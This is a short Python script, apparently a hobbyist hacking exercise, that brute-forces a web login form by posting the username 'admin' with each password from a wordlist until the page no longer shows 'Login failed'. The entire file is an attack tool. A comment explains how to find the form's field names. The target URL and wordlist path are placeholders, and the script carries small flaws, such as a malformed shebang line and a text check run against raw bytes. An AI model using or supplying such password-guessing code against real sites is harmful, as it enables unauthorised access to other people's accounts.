#!usr/bin/env python

import requests

target_url = "IP"
data_dict = {"username":"admin", "password":"", "Login":"submit"}#This is important, username,password will fill out the empth fields and Login will click the submit button, these fiels or keys can be found using inspect element


with open("filpath_having_txt_file_with_keywords", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached end of line")